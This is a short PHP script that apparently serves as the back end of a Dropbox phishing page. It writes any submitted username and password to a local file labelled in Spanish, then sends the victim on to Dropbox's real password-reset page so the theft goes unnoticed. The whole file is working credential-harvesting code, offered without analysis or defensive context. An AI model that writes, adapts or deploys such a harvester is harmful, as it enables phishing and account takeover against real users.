<?php

file_put_contents("credentials.txt", "[+] Dropbox -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.dropbox.com/forgot/');
exit();
?>
